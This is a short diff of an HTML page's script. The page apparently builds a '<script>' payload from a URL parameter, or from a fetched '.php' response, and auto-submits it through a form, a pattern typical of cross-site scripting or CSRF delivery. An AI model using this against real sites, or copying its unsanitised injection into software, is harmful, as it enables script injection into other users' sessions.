@@ -11,8 +11,15 @@
         </form>
         <script>
             let x=new URLSearchParams(window.location.search);
-            document.getElementById('t').value='<script>document.documentElement.innerHTML=`\n'+x.get('q')+'?>\n`;</'+'script>';
-            document.getElementById('f').submit();
+            let y=new XMLHttpRequest();
+            y.open('GET',x.get('q')+'.php');
+            y.send();
+            y.onreadystatechange=function(){
+                if(this.readyState==4 && this.status==200){
+                    document.getElementById('t').value='<script>document.documentElement.innerHTML=`\n'+this.responseText+'?>\n`;</'+'script>';
+                    document.getElementById('f').submit();
+                }
+            }
         </script>
     </body>
 </html>
